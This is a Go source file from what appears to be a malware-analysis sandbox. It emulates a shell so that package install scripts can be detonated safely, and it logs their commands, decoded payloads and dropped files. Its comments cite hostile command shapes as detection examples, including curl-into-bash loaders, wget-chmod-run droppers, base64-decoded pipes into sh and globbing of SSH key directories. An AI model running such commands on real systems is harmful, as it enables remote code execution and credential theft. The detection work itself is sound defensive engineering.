package sandbox

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/hex"
	"io"
	"io/fs"
	"os"
	"path"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"scbox/internal/third_party/sh/expand"
	"scbox/internal/third_party/sh/interp"
	"scbox/internal/third_party/sh/syntax"

	"scbox/internal/trace"
	"scbox/internal/vfs"
)

// shellOut captures the faked shell's stdout/stderr line-by-line and records it
// as program output, so anything the script echoes shows up in the report.
type shellOut struct {
	r   *Runtime
	op  string
	buf []byte
}

func (w *shellOut) Write(p []byte) (int, error) {
	w.buf = append(w.buf, p...)
	for {
		i := bytes.IndexByte(w.buf, '\n')
		if i < 0 {
			break
		}
		line := string(w.buf[:i])
		w.buf = w.buf[i+1:]
		if strings.TrimSpace(line) != "" {
			w.r.tr.Record(trace.CatConsole, w.op, line)
		}
	}
	return len(p), nil
}

func (w *shellOut) flush() {
	if strings.TrimSpace(string(w.buf)) != "" {
		w.r.tr.Record(trace.CatConsole, w.op, string(w.buf))
	}
	w.buf = nil
}

// RunShellScript interprets a shell script/command line in a fully faked shell:
// mvdan.cc/sh evaluates the real control flow, variables, quoting, pipes and
// command substitutions, but every command execution and file access is
// intercepted, logged, and faked - no real process is ever spawned and no real
// file is touched. node/ts-node/bun invocations are bridged into goja.
func (r *Runtime) RunShellScript(script, dir string) {
	if r.stopped() || strings.TrimSpace(script) == "" {
		return
	}
	prog, err := syntax.NewParser().Parse(strings.NewReader(script), "script.sh")
	if err != nil {
		r.tr.Note(trace.CatProc, "shell-parse-error", err.Error(), oneLineN(script, 200))
		return
	}
	// The faked shell executes a compound (curl … | bash, or a && b && c) as
	// separate commands, so a per-command IOC never carries the joined form the
	// high-fidelity signatures look for. Record each compound - pipelines AND
	// &&/|| lists - as the author wrote it so cross-stage patterns (curl|bash
	// loaders, fetch-then-run droppers split across &&) match.
	r.recordCompounds(prog)

	sout := &shellOut{r: r, op: "stdout"}
	serr := &shellOut{r: r, op: "stderr"}
	runner, err := interp.New(
		interp.Env(expand.ListEnviron(r.shellEnv()...)),
		interp.StdIO(strings.NewReader(""), sout, serr),
		interp.CallHandler(r.shellCall),
		interp.ExecHandler(r.shellExec),
		interp.OpenHandler(r.shellOpen),
		interp.StatHandler(r.shellStat),
		interp.ReadDirHandler2(r.shellReadDir),
	)
	if err != nil {
		r.tr.Note(trace.CatProc, "shell-init-error", err.Error())
		return
	}
	// The package lives in the in-memory FS at a virtual path that does not exist
	// on the host, so we cannot pass it to interp.Dir (which os.Stat-validates it).
	// New defaults Dir to a real cwd; we then point the runner at the virtual dir.
	// Run() resets PWD/dir-stack from it, and our open/stat handlers resolve
	// relative paths against it - every read comes from the FS, never the host.
	if dir != "" {
		runner.Dir = dir
	}
	// Record all commands up front so short-circuits/branches can't hide payloads.
	r.recordShellCommands(prog)
	ctx, cancel := context.WithTimeout(context.Background(), r.cfg.Timeout)
	defer cancel()
	_ = runner.Run(ctx, prog)
	sout.flush()
	serr.flush()
}

// recordCompounds records every shell compound in prog as a single command
// string, joined exactly as written: pipelines ("curl -sL http://x/p.sh | bash")
// and AND/OR lists ("wget x -O /tmp/p && chmod +x /tmp/p && /tmp/p"). The
// per-command exec handler only sees the individual stages, so without this any
// signature matching the joined form - downloader-into-interpreter, mkfifo-pipe
// reverse shells, fetch-then-run droppers spread across && - would silently miss
// payloads built with shell operators. Once the outermost compound is captured we
// stop descending: the full line already contains every nested stage (a pipe
// inside an && list is still in the rendered string), and the stages also run and
// are recorded individually via shellExec, so nothing is lost and the command IOC
// list stays free of partial duplicates.
func (r *Runtime) recordCompounds(prog *syntax.File) {
	printer := syntax.NewPrinter()
	syntax.Walk(prog, func(n syntax.Node) bool {
		bc, ok := n.(*syntax.BinaryCmd)
		if !ok {
			return true
		}
		switch bc.Op {
		case syntax.Pipe, syntax.PipeAll, syntax.AndStmt, syntax.OrStmt:
			var sb strings.Builder
			if err := printer.Print(&sb, bc); err == nil {
				r.tr.AddCommand(oneLineN(strings.Join(strings.Fields(sb.String()), " "), 400))
			}
			return false // whole compound captured; stages recorded individually
		}
		return true
	})
}

// RunShellFile reads and analyzes a .sh file from the in-memory FS.
func (r *Runtime) RunShellFile(abs string) {
	data, ok := r.cfg.FS.Read(abs)
	if !ok {
		r.tr.Note(trace.CatProc, "shell-read-error", "not found", abs)
		return
	}
	prev := r.tr.SetScope(scopeForPath(abs))
	defer r.tr.SetScope(prev)
	r.tr.Record(trace.CatModule, "shell-file", abs)
	r.RunShellScript(string(data), filepath.Dir(abs))
}

// shellEnv builds the environment the faked shell sees from the bait profile.
func (r *Runtime) shellEnv() []string {
	out := make([]string, 0, 24)
	for k, v := range r.baitEnv() {
		out = append(out, k+"="+v)
	}
	// mvdan/sh's runner seeds $UID/$EUID/$GID from the real host (os.Getuid /
	// os.Geteuid / os.Getgid) whenever the environment does not already define
	// them. baitEnv intentionally omits these (they are shell vars, not part of a
	// real process environ, so they must not appear in the faked process.env), so
	// we provide them here on the shell side only. Without this, a script reading
	// $EUID/$UID (ubiquitous in install scripts: `[ "$EUID" -ne 0 ]`) would see
	// the analyzer's real host uid instead of the faked profile (uid 1000, which
	// the rest of the profile already implies via /run/user/1000).
	out = append(out, "UID=1000", "EUID=1000", "GID=1000")
	return out
}

// recordShellCommands records every call expression in the script so that
// payloads hidden behind failed branches are still visible to detection.
func (r *Runtime) recordShellCommands(prog *syntax.File) {
	printer := syntax.NewPrinter()
	seen := map[string]bool{}
	syntax.Walk(prog, func(n syntax.Node) bool {
		ce, ok := n.(*syntax.CallExpr)
		if !ok {
			return true
		}
		var sb strings.Builder
		if err := printer.Print(&sb, ce); err != nil {
			return true
		}
		cmd := oneLineN(strings.Join(strings.Fields(sb.String()), " "), 400)
		if cmd == "" || seen[cmd] {
			return false
		}
		seen[cmd] = true
		r.tr.AddCommand(cmd)
		return false
	})
}

// shellExec intercepts every command the script tries to run.
func (r *Runtime) shellExec(ctx context.Context, args []string) error {
	if len(args) == 0 || r.stopped() {
		return nil
	}
	full := strings.Join(args, " ")
	hc := interp.HandlerCtx(ctx)

	// Interpreter invocations (node/ts-node/bash …) are bridged into the sandbox
	// to run the package's *own* scripts - that's the normal install mechanism,
	// not a malicious external-process spawn, so it is NOT recorded as proc
	// activity. Whatever the bridged script then does is analyzed and scored on
	// its own. Only foreign binaries (the default case) count as a spawn.
	switch filepath.Base(args[0]) {
	case "node", "nodejs", "bun", "deno":
		r.tr.Record(trace.CatModule, "run-node", full)
		r.shellRunNode(args[1:], hc.Dir)
	case "ts-node", "tsx", "ts-node-esm", "swc-node":
		r.tr.Record(trace.CatModule, "run-ts-node", full)
		r.shellRunScriptFile(args[1:], hc.Dir)
	case "bash", "sh", "dash", "zsh", "ksh":
		r.tr.Record(trace.CatModule, "run-shell", full)
		r.shellRunBash(args[1:], hc.Dir, hc.Stdin)
	default:
		// A foreign binary (curl, gh, git, rm, systemctl, python, …): a genuine
		// external-process spawn. Record + fake it, returning believable stdout
		// so multi-stage scripts proceed.
		r.tr.Record(trace.CatProc, "shell-exec", full)
		r.tr.AddCommand(full)
		// Stdin-consuming decode/transform filters (base64 -d, xxd -r, gunzip, cat,
		// tee) come first: a loader pipes an encoded blob through one of these into a
		// shell (`echo <b64> | base64 -d | sh`), so forwarding the *decoded* bytes
		// downstream lets the final `| sh` detonate the real payload, and the recovered
		// plaintext is filed as a decoded blob for the scanners.
		if out, handled := r.shellFilter(args, hc.Stdin); handled {
			_, _ = hc.Stdout.Write(out)
		} else if out := fakeCommandOutput(r, args); len(out) > 0 {
			_, _ = io.WriteString(hc.Stdout, out)
		}
	}
	return nil
}

// slurpStdin reads a piped stdin (empty for a non-pipeline command), bounded to
// defuse a decompression/echo bomb.
func slurpStdin(rdr io.Reader) []byte {
	if rdr == nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(rdr, 8<<20))
	return b
}

// shellFilter emulates the stdin-consuming decode/transform filters loaders chain
// before piping into an interpreter (`… | base64 -d | sh`). It reads stdin,
// applies the transform, records any recovered payload as a decoded blob (so the
// signatures/IOC scanners see the URL/command inside), and returns the bytes to
// forward to the next pipe stage. Returns handled=false for anything it doesn't
// emulate, so fakeCommandOutput still runs.
func (r *Runtime) shellFilter(args []string, stdin io.Reader) ([]byte, bool) {
	bin := filepath.Base(args[0])
	rest := args[1:]
	has := func(flags ...string) bool {
		for _, a := range rest {
			for _, f := range flags {
				if a == f {
					return true
				}
			}
		}
		return false
	}
	onlyStdin := func() bool { // no file operands (only flags or "-")
		for _, a := range rest {
			if a != "-" && !strings.HasPrefix(a, "-") {
				return false
			}
		}
		return true
	}
	record := func(b []byte, op string) {
		if len(b) >= 4 {
			r.tr.AddDecoded(string(b))
			r.tr.Record(trace.CatEval, op, oneLineN(string(b), 200))
		}
	}
	switch bin {
	case "base64":
		if has("-d", "--decode", "-D", "-di") {
			in := strings.Map(func(r rune) rune {
				if r == '\n' || r == '\r' || r == ' ' || r == '\t' {
					return -1
				}
				return r
			}, string(slurpStdin(stdin)))
			if dec, ok := decodeBase64Any(in); ok {
				record(dec, "base64-d(shell)")
				return dec, true
			}
			return nil, true
		}
	case "xxd":
		if has("-r") {
			in := strings.Map(func(r rune) rune {
				if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
					return r
				}
				return -1
			}, string(slurpStdin(stdin)))
			if dec, err := hex.DecodeString(in); err == nil {
				record(dec, "xxd-r(shell)")
				return dec, true
			}
			return nil, true
		}
	case "gunzip", "zcat":
		if zr, err := gzip.NewReader(bytes.NewReader(slurpStdin(stdin))); err == nil {
			defer zr.Close()
			if dec, err := io.ReadAll(io.LimitReader(zr, 16<<20)); err == nil {
				record(dec, "gunzip(shell)")
				return dec, true
			}
		}
		return nil, true
	case "gzip":
		if has("-d", "--decompress", "--uncompress") {
			if zr, err := gzip.NewReader(bytes.NewReader(slurpStdin(stdin))); err == nil {
				defer zr.Close()
				if dec, err := io.ReadAll(io.LimitReader(zr, 16<<20)); err == nil {
					record(dec, "gzip-d(shell)")
					return dec, true
				}
			}
			return nil, true
		}
	case "cat":
		if onlyStdin() { // `cat` / `cat -` forwards stdin
			return slurpStdin(stdin), true
		}
	case "tee":
		data := slurpStdin(stdin)
		for _, f := range rest { // tee FILE… drops the stream to each file
			if !strings.HasPrefix(f, "-") {
				r.tr.Record(trace.CatFS, "shell-write", f)
				r.tr.AddDropped(f)
				r.vfsWrite(f, string(data), false)
			}
		}
		return data, true
	}
	return nil, false
}

// forkModule loads and runs a module referenced by child_process.fork, resolving
// a relative spec against the virtual project dir. Guarded so a missing/odd target
// can't abort the analysis. This detonates a dropped-then-forked payload.
func (r *Runtime) forkModule(spec string) {
	abs := spec
	if !filepath.IsAbs(abs) {
		abs = filepath.Join(r.cfg.VirtualBase, spec)
	}
	defer func() { _ = recover() }()
	r.RunModuleFile(abs)
}

func (r *Runtime) shellRunNode(args []string, dir string) {
	for i := 0; i < len(args); i++ {
		a := args[i]
		switch {
		case a == "-e" || a == "--eval" || a == "-p" || a == "--print":
			if i+1 < len(args) {
				r.tr.Record(trace.CatEval, "node-eval(shell)", args[i+1])
				r.RunTopLevel("[eval]", args[i+1], dir)
			}
			return
		case a == "-r" || a == "--require":
			i++ // skip the preload module argument (e.g. ts-node/register)
			continue
		case strings.HasPrefix(a, "-"):
			continue
		case a == "":
			continue // `node ''` - no script to run
		default:
			// Run with process.argv = [node, <script>, ...rest] (via bridgeNodeChild)
			// and fresh, so loaders that self-reference through process.argv[1] -
			// the DPRK self-re-exec pattern, spawn('node',[process.argv[1],'--bg'])
			// - target the correct script and re-execute their payload branch.
			r.bridgeNodeChild("node", args[i:], dir)
			return
		}
	}
}

func (r *Runtime) shellRunScriptFile(args []string, dir string) {
	// Bridge through bridgeNodeChild so process.argv is set to the script's own
	// argv ([node, <script>, ...args]) and the file runs fresh. DPRK loaders
	// self-reference via process.argv[1] (e.g. spawn('node',[process.argv[1],
	// '--bg'])); without the correct argv the loader targets the wrong file and
	// the payload branch never executes.
	_ = dir
	r.bridgeNodeChild("node", args, dir)
}

func (r *Runtime) shellRunBash(args []string, dir string, stdin io.Reader) {
	for i := 0; i < len(args); i++ {
		a := args[i]
		if a == "-c" && i+1 < len(args) {
			r.RunShellScript(args[i+1], dir)
			return
		}
		if a == "" || strings.HasPrefix(a, "-") {
			continue
		}
		r.RunShellFile(filepath.Join(dir, a))
		return
	}
	// No -c and no script file: a bare `sh`/`bash` at the end of a pipeline runs
	// its piped stdin as a script (the `… | base64 -d | sh` loader shape). Detonate
	// it so the decoded payload that the upstream filter forwarded actually runs.
	if script := strings.TrimSpace(string(slurpStdin(stdin))); script != "" {
		r.RunShellScript(script, dir)
	}
}

// shellOpen fakes all file access from the shell: reads return believable
// content, writes are logged as dropped files and discarded.
func (r *Runtime) shellOpen(ctx context.Context, path string, flag int, perm os.FileMode) (io.ReadWriteCloser, error) {
	if flag&(os.O_WRONLY|os.O_RDWR|os.O_CREATE|os.O_APPEND|os.O_TRUNC) != 0 && flag&os.O_RDONLY == 0 {
		r.tr.Record(trace.CatFS, "shell-write", path)
		r.tr.AddDropped(path)
		// Capture written bytes into the in-memory FS so a later read-back is
		// consistent, and so the content becomes a dropped-file IOC.
		return &vfsWriteFile{r: r, path: path, append: flag&os.O_APPEND != 0}, nil
	}
	r.tr.Record(trace.CatFS, "shell-read", path)
	r.tr.AddPath(path)
	content, notExist := r.readFake(path)
	if notExist {
		return nil, os.ErrNotExist
	}
	return &fakeFile{Reader: strings.NewReader(content)}, nil
}

// shellReadDir answers directory listings during shell glob expansion. Without
// it, mvdan/sh falls back to the default handler (os.ReadDir), letting a script
// like `for f in /etc/*` or `cat /home/*/.ssh/*` enumerate the REAL host
// filesystem - a sandbox escape and an information leak. We list only the
// in-memory FS: the materialized package tree plus any files the sample itself
// dropped (r.vfs). Globs over paths that do not exist in the virtual FS expand
// to nothing, revealing nothing about the host.
func (r *Runtime) shellReadDir(_ context.Context, dir string) ([]fs.DirEntry, error) {
	clean := vfs.Clean(dir)
	names := map[string]bool{}
	if r.cfg.FS != nil {
		for _, n := range r.cfg.FS.ReadDir(clean) {
			names[n] = true
		}
	}
	// Include sample-dropped files that live only in r.vfs.
	prefix := clean
	if prefix != "/" {
		prefix += "/"
	}
	for p := range r.vfs {
		cp := vfs.Clean(p)
		if !strings.HasPrefix(cp, prefix) {
			continue
		}
		rest := cp[len(prefix):]
		if i := strings.IndexByte(rest, '/'); i >= 0 {
			rest = rest[:i]
		}
		if rest != "" {
			names[rest] = true
		}
	}
	if len(names) == 0 {
		return nil, nil
	}
	sorted := make([]string, 0, len(names))
	for n := range names {
		sorted = append(sorted, n)
	}
	sort.Strings(sorted)
	out := make([]fs.DirEntry, 0, len(sorted))
	for _, n := range sorted {
		isDir, _ := dirEntryKind(r, path.Join(clean, n))
		out = append(out, fs.FileInfoToDirEntry(fakeFileInfo{name: n, dir: isDir}))
	}
	return out, nil
}

// dirEntryKind reports whether a virtual path is a directory, consulting the
// materialized FS first and falling back to the name-shape heuristic used by
// shellStat so glob results and stat results agree.
func dirEntryKind(r *Runtime, p string) (isDir, exists bool) {
	if r.cfg.FS != nil {
		if d, ok := r.cfg.FS.Stat(p); ok {
			return d, true
		}
	}
	return looksLikeDir(p), false
}

// shellCall intercepts simple commands (including builtins) before they run.
// Its job is to neutralize directory-changing builtins: the analyzed package
// lives only in the in-memory FS, so there is no real working directory, and on
// Linux mvdan's cd/pushd/popd verify the target with a real access(2) syscall
// (it bypasses our stat handler entirely) that always fails for a virtual path.
// That produced the spurious "cd: permission denied" output AND - because cd
// then returns non-zero - aborted `cd <dir> && <payload>` chains before the
// payload ran. Rewriting these to `true` lets the chain detonate fully; file
// access stays resolved against the package dir via the open/stat handlers.
func (r *Runtime) shellCall(_ context.Context, args []string) ([]string, error) {
	if len(args) > 0 {
		switch args[0] {
		case "cd", "pushd", "popd":
			return []string{"true"}, nil
		}
	}
	return args, nil
}

// shellStat answers existence checks ([ -f ... ], cd targets): VM/sandbox
// artifacts report missing, everything else reports present. The reported
// directory-ness matters: mvdan/sh's `cd` builtin fails unless the target stats
// as a directory, so a wrong answer here breaks `cd dir && …` chains (aborting
// the script before any later - possibly malicious - command runs). We infer it
// from the name's shape: a component carrying an extension or a leading-dot
// (package.json, .npmrc, index.ts) is a regular file; anything else (/tmp, src,
// node_modules, a cleaned `..`) is treated as a directory.
func (r *Runtime) shellStat(ctx context.Context, name string, _ bool) (os.FileInfo, error) {
	if looksLikeSandboxArtifact(name) {
		return nil, os.ErrNotExist
	}
	return fakeFileInfo{name: filepath.Base(name), dir: looksLikeDir(name)}, nil
}

// looksLikeDir guesses whether a faked path is a directory from its final
// component: a dot anywhere in the basename (an extension like ".js" or a
// dotfile like ".npmrc") marks a regular file; everything else is a directory.
func looksLikeDir(p string) bool {
	base := filepath.Base(strings.TrimRight(p, "/"))
	if base == "" || base == "/" || base == "." {
		return true
	}
	return !strings.Contains(base, ".")
}

// fakeFile is an in-memory stand-in for a file the shell opens for reading.
type fakeFile struct{ *strings.Reader }

func (f *fakeFile) Write(p []byte) (int, error) { return len(p), nil }
func (f *fakeFile) Close() error                { return nil }

// vfsWriteFile captures everything written to a shell-opened file into the
// in-memory FS (on Close), and records the dropped content as an IOC.
type vfsWriteFile struct {
	r      *Runtime
	path   string
	append bool
	buf    strings.Builder
}

func (w *vfsWriteFile) Read(p []byte) (int, error) { return 0, io.EOF }
func (w *vfsWriteFile) Write(p []byte) (int, error) {
	w.buf.Write(p)
	return len(p), nil
}
func (w *vfsWriteFile) Close() error {
	data := w.buf.String()
	w.r.vfsWrite(w.path, data, w.append)
	if strings.TrimSpace(data) != "" {
		w.r.tr.Note(trace.CatFS, "shell-write-data", data, w.path)
	}
	return nil
}

// fakeFileInfo is a minimal os.FileInfo for faked stat results.
type fakeFileInfo struct {
	name string
	dir  bool
}

func (fi fakeFileInfo) Name() string { return fi.name }
func (fi fakeFileInfo) Size() int64  { return 1024 }
func (fi fakeFileInfo) Mode() os.FileMode {
	if fi.dir {
		return os.ModeDir | 0o755
	}
	return 0o644
}
func (fi fakeFileInfo) ModTime() time.Time { return time.Unix(1700000000, 0) }
func (fi fakeFileInfo) IsDir() bool        { return fi.dir }
func (fi fakeFileInfo) Sys() any           { return nil }

func oneLineN(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", "\\n")
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}
